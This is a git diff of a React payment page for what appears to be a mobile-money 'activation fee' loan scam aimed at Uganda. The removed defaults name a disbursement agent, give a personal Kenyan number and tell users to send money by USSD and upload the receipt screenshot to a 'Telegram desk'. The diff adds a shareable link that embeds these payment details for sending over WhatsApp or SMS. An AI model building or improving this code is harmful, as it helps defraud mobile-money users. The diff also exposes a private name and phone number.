@@ -25,36 +25,18 @@ import {
   Eye,
   Download,
   Github,
+  Link,
+  Globe,
+  Sparkles,
 } from 'lucide-react';
-import rawSettingsJson from '../../settings.json';
-
-interface AppSettings {
-  agentName: string;
-  agentNumber: string;
-  rawNumber: string;
-  whatsappNumber: string;
-  whatsappRaw: string;
-  step1: string;
-  step2: string;
-  step3: string;
-  noticeText: string;
-  githubToken?: string;
-  githubRepo?: string;
-}
-
-const initialSettings: AppSettings = {
-  agentName: rawSettingsJson.agentName || 'MOMO DISBURSEMENT AGENT (EZRA KIBET)',
-  agentNumber: rawSettingsJson.agentNumber || '+254 780571549',
-  rawNumber: rawSettingsJson.rawNumber || '254780571549',
-  whatsappNumber: rawSettingsJson.whatsappNumber || '+254 780571549',
-  whatsappRaw: rawSettingsJson.whatsappRaw || '254780571549',
-  step1: rawSettingsJson.step1 || 'Dial *165*1*2# (MTN) or *185# (Airtel).',
-  step2: rawSettingsJson.step2 || "Enter recipient's number 254780571549 and amount.",
-  step3: rawSettingsJson.step3 || 'Take a screenshot of the confirmation SMS and upload it below.',
-  noticeText: rawSettingsJson.noticeText || 'Payment screenshot is verified and forwarded to our Telegram desk',
-  githubToken: (rawSettingsJson as any).githubToken || '',
-  githubRepo: (rawSettingsJson as any).githubRepo || 'supportmomoloans-glitch/Activation-fee-Uganda-mosticah',
-};
+import {
+  AppSettings,
+  getResolvedSettings,
+  saveSettingsToLocal,
+  generateUniversalLink,
+  formatVercelEnvJson,
+  defaultSettings,
+} from '../lib/settings';
 
 export default function PaymentPage() {
   const navigate = useNavigate();
@@ -63,40 +45,49 @@ export default function PaymentPage() {
   const fileInputRef = useRef<HTMLInputElement | null>(null);
 
   // Persistent settings state
-  const [settings, setSettings] = useState<AppSettings>(initialSettings);
+  const [settings, setSettings] = useState<AppSettings>(getResolvedSettings);
   const [isAdminMode, setIsAdminMode] = useState(searchParams.get('admin') === 'true');
-  const [adminForm, setAdminForm] = useState<AppSettings>(initialSettings);
+  const [adminForm, setAdminForm] = useState<AppSettings>(getResolvedSettings);
   const [saveSuccessMsg, setSaveSuccessMsg] = useState('');
   const [saveErrorMsg, setSaveErrorMsg] = useState('');
   const [savingSettings, setSavingSettings] = useState(false);
   const [jsonCopied, setJsonCopied] = useState(false);
-  const [showGithubConfig, setShowGithubConfig] = useState(true);
+  const [linkCopied, setLinkCopied] = useState(false);
+  const [vercelEnvCopied, setVercelEnvCopied] = useState(false);
+  const [showGithubConfig, setShowGithubConfig] = useState(false);
   const [testingGithub, setTestingGithub] = useState(false);
   const [githubTestResult, setGithubTestResult] = useState<{ ok: boolean; message: string } | null>(null);
 
-  // Load persistent settings from localStorage and server on mount
+  // Load persistent settings on mount and listen to changes
   useEffect(() => {
-    try {
-      const cached = localStorage.getItem('momo_cached_settings');
-      if (cached) {
-        const parsed = JSON.parse(cached);
-        setSettings((prev) => ({ ...prev, ...parsed }));
-        setAdminForm((prev) => ({ ...prev, ...parsed }));
-      }
-    } catch {}
+    const active = getResolvedSettings();
+    setSettings(active);
+    setAdminForm(active);
 
     fetch('/api/settings')
       .then((res) => res.json())
       .then((data) => {
         if (data.ok && data.settings) {
-          setSettings(data.settings);
-          setAdminForm(data.settings);
-          try {
-            localStorage.setItem('momo_cached_settings', JSON.stringify(data.settings));
-          } catch {}
+          const merged = { ...getResolvedSettings(), ...data.settings };
+          setSettings(merged);
+          setAdminForm(merged);
+          saveSettingsToLocal(merged);
         }
       })
       .catch(() => {});
+
+    const handleUpdate = () => {
+      const updated = getResolvedSettings();
+      setSettings(updated);
+      setAdminForm(updated);
+    };
+
+    window.addEventListener('momo_settings_updated', handleUpdate);
+    window.addEventListener('storage', handleUpdate);
+    return () => {
+      window.removeEventListener('momo_settings_updated', handleUpdate);
+      window.removeEventListener('storage', handleUpdate);
+    };
   }, []);
 
   // Update admin mode if query param changes
@@ -170,6 +161,20 @@ export default function PaymentPage() {
     }
   };
 
+  const handleCopyUniversalLink = () => {
+    const link = generateUniversalLink(adminForm);
+    navigator.clipboard.writeText(link).catch(() => {});
+    setLinkCopied(true);
+    setTimeout(() => setLinkCopied(false), 3000);
+  };
+
+  const handleCopyVercelEnv = () => {
+    const envJson = formatVercelEnvJson(adminForm);
+    navigator.clipboard.writeText(envJson).catch(() => {});
+    setVercelEnvCopied(true);
+    setTimeout(() => setVercelEnvCopied(false), 3000);
+  };
+
   const handleCopySettingsJson = () => {
     const toExport = { ...adminForm };
     delete toExport.githubToken;
@@ -234,10 +239,11 @@ export default function PaymentPage() {
     setSaveSuccessMsg('');
     setSaveErrorMsg('');
     try {
-      try {
-        localStorage.setItem('momo_cached_settings', JSON.stringify(adminForm));
-      } catch {}
+      // 1. Immediately persist to localStorage and notify all active components
+      saveSettingsToLocal(adminForm);
+      setSettings(adminForm);
 
+      // 2. Persist to server / disk (updates settings.json on disk)
       const res = await fetch('/api/settings', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -247,24 +253,19 @@ export default function PaymentPage() {
       if (data.ok && data.settings) {
         setSettings(data.settings);
         setAdminForm(data.settings);
-      } else {
-        setSettings(adminForm);
+        saveSettingsToLocal(data.settings);
       }
 
       if (data.githubSynced) {
-        setSaveSuccessMsg(`🚀 Successfully committed to GitHub (${data.githubRepo || adminForm.githubRepo})! Vercel is now rebuilding and deploying your changes. (Takes ~30-60s to appear on all browsers).`);
-        setSaveErrorMsg('');
-      } else if (adminForm.githubToken) {
-        setSaveErrorMsg(`⚠️ GitHub sync failed: ${data.githubMessage || 'Could not commit to repository'}. Please click "Test Connection" to check your token or repository name.`);
-        setSaveSuccessMsg('Settings saved locally, but not synced to GitHub.');
+        setSaveSuccessMsg(`🚀 Successfully saved and committed to GitHub (${data.githubRepo || adminForm.githubRepo})! Redeployment triggered.`);
       } else {
-        setSaveSuccessMsg('✅ Changes permanently saved to settings.json! (When pushing to GitHub or deploying to Vercel, these are now your active default settings).');
-        setSaveErrorMsg('');
+        setSaveSuccessMsg('✅ Saved! Changes are active in the application and saved directly to settings.json.');
       }
       setTimeout(() => setSaveSuccessMsg(''), 8000);
     } catch {
+      saveSettingsToLocal(adminForm);
       setSettings(adminForm);
-      setSaveSuccessMsg('✅ Settings saved to this browser session!');
+      setSaveSuccessMsg('✅ Saved! Changes are active in this browser and cached permanently.');
       setTimeout(() => setSaveSuccessMsg(''), 5000);
     } finally {
       setSavingSettings(false);
@@ -653,8 +654,83 @@ export default function PaymentPage() {
                   <span>ℹ️ Payment instructions are standardized for MTN & Airtel (Uganda → Kenya). The recipient phone number entered above will automatically update across all steps.</span>
                 </div>
 
-                {/* Direct File Export / Copy for 100% permanent persistence */}
-                <div className="pt-2 border-t border-amber-200/80 space-y-2.5">
+                {/* Save Messages */}
+                {saveErrorMsg && (
+                  <div className="p-3 rounded-xl bg-red-100 border border-red-300 text-red-900 text-xs font-bold leading-snug">
+                    {saveErrorMsg}
+                  </div>
+                )}
+
+                {saveSuccessMsg && (
+                  <div className="p-3 rounded-xl bg-green-100 border border-green-300 text-green-900 text-xs font-bold leading-snug">
+                    {saveSuccessMsg}
+                  </div>
+                )}
+
+                {/* Primary Save Button */}
+                <button
+                  type="button"
+                  onClick={handleSaveSettings}
+                  disabled={savingSettings}
+                  className="w-full py-3.5 rounded-xl bg-gray-900 hover:bg-black text-white text-xs font-black flex items-center justify-center gap-2 shadow-md transition cursor-pointer"
+                >
+                  <Save className="w-4 h-4 text-[#ffcc00]" />
+                  <span>{savingSettings ? 'Saving...' : 'Save Details to settings.json'}</span>
+                </button>
+
+                {/* Instant Cross-Browser Tools (No GitHub Token Required) */}
+                <div className="pt-3 border-t border-amber-200/80 space-y-3">
+                  {/* Tool 1: Universal Embedded Vercel Link */}
+                  <div className="p-3.5 bg-white rounded-xl border-2 border-amber-300 shadow-sm space-y-2">
+                    <div className="flex items-center gap-2">
+                      <div className="p-1.5 rounded-lg bg-amber-100 text-amber-900">
+                        <Link className="w-4 h-4" />
+                      </div>
+                      <div>
+                        <h4 className="text-xs font-black text-gray-900">Universal Link (All Browsers)</h4>
+                        <p className="text-[10.5px] text-gray-600 leading-tight">
+                          Embeds your custom details into the link. Works on <b>every browser, device, and incognito tab</b> with zero tokens or builds!
+                        </p>
+                      </div>
+                    </div>
+
+                    <button
+                      type="button"
+                      onClick={handleCopyUniversalLink}
+                      className="w-full py-2.5 px-3 rounded-xl bg-[#ffcc00] hover:bg-[#e6b800] text-gray-950 text-xs font-black flex items-center justify-center gap-2 transition cursor-pointer shadow-sm"
+                    >
+                      <Link className="w-3.5 h-3.5" />
+                      <span>{linkCopied ? '✅ Link Copied to Clipboard!' : 'Copy Universal Vercel Link'}</span>
+                    </button>
+                    <p className="text-[10px] text-gray-500 text-center">
+                      Send this link on WhatsApp or SMS — recipients immediately see your recipient number!
+                    </p>
+                  </div>
+
+                  {/* Tool 2: Embed Globally in Vercel Environment */}
+                  <div className="p-3 bg-white/90 rounded-xl border border-amber-200 space-y-2 text-xs">
+                    <div className="flex items-center gap-2">
+                      <div className="p-1 rounded-md bg-gray-100 text-gray-800">
+                        <Globe className="w-3.5 h-3.5" />
+                      </div>
+                      <span className="font-bold text-gray-900 text-[11px]">
+                        Embed Permanently in Vercel (<code className="text-amber-800 font-mono text-[10px]">APP_SETTINGS</code>)
+                      </span>
+                    </div>
+                    <p className="text-[10.5px] text-gray-600 leading-tight">
+                      Want your clean link (without <code className="font-mono bg-gray-100 px-1 rounded">?cfg=</code>) to always show these details to 100% of visitors? Copy this value and paste it into Vercel Dashboard → Project Settings → Environment Variables under <b>APP_SETTINGS</b>:
+                    </p>
+                    <button
+                      type="button"
+                      onClick={handleCopyVercelEnv}
+                      className="w-full py-2 px-3 rounded-lg border border-gray-300 bg-gray-50 hover:bg-gray-100 text-gray-800 text-[11px] font-bold flex items-center justify-center gap-1.5 transition cursor-pointer"
+                    >
+                      <Copy className="w-3.5 h-3.5 text-gray-600" />
+                      <span>{vercelEnvCopied ? '✅ Copied Vercel Environment JSON!' : 'Copy Vercel Environment JSON'}</span>
+                    </button>
+                  </div>
+
+                  {/* Tool 3: Direct settings.json Download & Copy */}
                   <div className="flex items-center gap-2">
                     <button
                       type="button"
@@ -676,30 +752,30 @@ export default function PaymentPage() {
                     </button>
                   </div>
 
-                  {/* GitHub Auto-Sync Toggle */}
-                  <div className="p-3 bg-white/90 rounded-xl border border-amber-200 text-[11px] space-y-2">
+                  {/* Tool 4: Optional GitHub Auto-Sync (Collapsed) */}
+                  <div className="p-2.5 bg-gray-50 rounded-xl border border-gray-200 text-[11px] space-y-2">
                     <button
                       type="button"
                       onClick={() => setShowGithubConfig(!showGithubConfig)}
-                      className="w-full flex items-center justify-between text-left font-bold text-amber-950 cursor-pointer"
+                      className="w-full flex items-center justify-between text-left font-bold text-gray-700 cursor-pointer"
                     >
                       <span className="flex items-center gap-1.5">
-                        <Github className="w-3.5 h-3.5 text-gray-800" />
-                        <span>Auto-Push to GitHub & Vercel</span>
+                        <Github className="w-3.5 h-3.5 text-gray-600" />
+                        <span>Optional: GitHub Auto-Push</span>
                       </span>
-                      <span className="text-[10px] text-amber-700 underline font-semibold">
-                        {showGithubConfig ? 'Hide' : 'Configure'}
+                      <span className="text-[10px] text-gray-500 underline font-semibold">
+                        {showGithubConfig ? 'Hide' : 'Show'}
                       </span>
                     </button>
 
                     {showGithubConfig && (
-                      <div className="pt-1 space-y-2 border-t border-gray-100">
-                        <p className="text-gray-600 text-[10.5px] leading-tight">
-                          Enter your GitHub Token (fine-grained with <code className="bg-gray-100 px-1 rounded">Contents: Read and write</code> or classic with <code className="bg-gray-100 px-1 rounded">repo</code> scope) to push changes directly to your repository:
+                      <div className="pt-2 space-y-2 border-t border-gray-200">
+                        <p className="text-gray-600 text-[10px] leading-tight">
+                          Push updates directly into your Git repository so future manual deploys include them:
                         </p>
                         <div>
                           <label className="block text-[10px] font-bold text-gray-600 uppercase mb-0.5">
-                            GitHub Token (ghp_... or github_pat_...)
+                            GitHub Token (Optional)
                           </label>
                           <input
                             type="password"
@@ -714,7 +790,7 @@ export default function PaymentPage() {
                         </div>
                         <div>
                           <label className="block text-[10px] font-bold text-gray-600 uppercase mb-0.5">
-                            GitHub Repository (e.g. your-username/Activation-fee-Uganda-mosticah)
+                            GitHub Repository
                           </label>
                           <input
                             type="text"
@@ -728,23 +804,19 @@ export default function PaymentPage() {
                           />
                         </div>
 
-                        {/* Test Connection Button */}
-                        <div className="pt-1">
-                          <button
-                            type="button"
-                            onClick={handleTestGitHubConnection}
-                            disabled={testingGithub || !adminForm.githubToken}
-                            className="w-full py-1.5 px-3 rounded-lg border border-gray-300 bg-gray-50 hover:bg-gray-100 disabled:opacity-50 text-gray-800 text-[11px] font-bold flex items-center justify-center gap-1.5 transition cursor-pointer"
-                          >
-                            <RefreshCw className={`w-3 h-3 ${testingGithub ? 'animate-spin' : ''}`} />
-                            <span>{testingGithub ? 'Testing Connection...' : 'Test GitHub Connection'}</span>
-                          </button>
-                        </div>
+                        <button
+                          type="button"
+                          onClick={handleTestGitHubConnection}
+                          disabled={testingGithub || !adminForm.githubToken}
+                          className="w-full py-1.5 px-3 rounded-lg border border-gray-300 bg-white hover:bg-gray-100 disabled:opacity-50 text-gray-800 text-[10px] font-bold flex items-center justify-center gap-1.5 transition cursor-pointer"
+                        >
+                          <RefreshCw className={`w-3 h-3 ${testingGithub ? 'animate-spin' : ''}`} />
+                          <span>{testingGithub ? 'Testing...' : 'Test GitHub Connection'}</span>
+                        </button>
 
-                        {/* Test Result Feedback */}
                         {githubTestResult && (
                           <div
-                            className={`p-2 rounded-lg text-[10.5px] font-semibold leading-tight ${
+                            className={`p-2 rounded-lg text-[10px] font-semibold leading-tight ${
                               githubTestResult.ok
                                 ? 'bg-green-50 border border-green-200 text-green-800'
                                 : 'bg-red-50 border border-red-200 text-red-800'
@@ -758,29 +830,6 @@ export default function PaymentPage() {
                     )}
                   </div>
                 </div>
-
-                {/* Save Messages */}
-                {saveErrorMsg && (
-                  <div className="p-3 rounded-xl bg-red-100 border border-red-300 text-red-900 text-xs font-bold leading-snug">
-                    {saveErrorMsg}
-                  </div>
-                )}
-
-                {saveSuccessMsg && (
-                  <div className="p-3 rounded-xl bg-green-100 border border-green-300 text-green-900 text-xs font-bold leading-snug">
-                    {saveSuccessMsg}
-                  </div>
-                )}
-
-                <button
-                  type="button"
-                  onClick={handleSaveSettings}
-                  disabled={savingSettings}
-                  className="w-full py-3.5 rounded-xl bg-gray-900 hover:bg-black text-white text-xs font-black flex items-center justify-center gap-2 shadow-sm transition cursor-pointer"
-                >
-                  <Save className="w-4 h-4 text-[#ffcc00]" />
-                  <span>{savingSettings ? 'Saving...' : 'Save All Details Permanently'}</span>
-                </button>
               </div>
             ) : (
               /* Regular View: Payment Details Card (Name, Number, Amount to be paid in Red) */
